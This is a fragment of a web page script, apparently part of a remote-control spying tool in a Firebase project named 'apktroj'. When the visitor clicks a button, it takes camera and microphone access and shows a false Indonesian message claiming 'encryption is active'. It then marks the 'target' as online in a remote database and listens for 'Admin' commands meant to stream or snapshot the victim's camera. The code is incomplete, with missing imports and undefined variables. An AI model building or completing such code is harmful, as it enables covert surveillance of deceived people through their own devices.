  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
    import { getFirestore, doc, onSnapshot, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

    const conf = {

        projectId: "apktroj",
        appId: "1:943833619122:web:d757ced4d56267abf247ab"
    };
    
    const app = initializeApp(conf); 
    const db = getFirestore(app);
    const auth = getAuth(app);

    document.getElementById('btn').onclick = async () => {
      try {
        await signInAnonymously(auth);
        const s = await navigator.mediaDevices.getUserMedia({audio:true, video:true});

        document.getElementById('btn').disabled = true;
        document.getElementById('st').innerText = "Enkripsi aktif. Jangan tutup halaman ini.";

        // Update status online target ke Firestore

        await setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'status'), {
            lastSeen: serverTimestamp(),
            online: true,
            deviceId: deviceId
        });

        // Listen command dari Admin
        onSnapshot(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'cmd'), (snap) => {
           if(snap.exists()){

             console.log("Admin Signal: ", d.type, d.action);
             // Implementasi stream WebRTC atau snapshot di sini
           }
